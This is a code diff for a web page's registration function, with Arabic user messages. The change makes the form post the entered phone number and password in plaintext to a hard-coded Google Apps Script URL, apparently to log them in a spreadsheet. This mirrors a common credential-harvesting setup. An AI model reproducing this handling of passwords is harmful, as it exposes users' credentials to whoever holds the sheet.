@@ -93,9 +93,28 @@ function disagree() {
 function register() {
   const phone = document.getElementById('phone').value;
   const password = document.getElementById('password').value;
-  alert(`تم التسجيل برقم ${phone}`);
-  // يمكن إرسال البيانات إلى Google Sheets هنا
+
+  const url = "https://script.google.com/macros/s/AKfycbw7xDQY1OVhDtgpvOvXfrIIyCJp0xhHCXo6ih-HHlljWpOVVi8RZMPG-DK8idUVry94rg/exec";
+
+  const formData = new FormData();
+  formData.append("phone", phone);
+  formData.append("password", password);
+
+  fetch(url, {
+    method: "POST",
+    body: formData
+  })
+  .then(() => {
+    alert(`✅ تم التسجيل بنجاح برقم ${phone}`);
+    document.getElementById('phone').value = "";
+    document.getElementById('password').value = "";
+  })
+  .catch(err => {
+    alert("❌ حدث خطأ أثناء الإرسال");
+    console.error(err);
+  });
 }
+
 
 function hideModal() {
   document.getElementById('consent-modal').style.display = 'none';
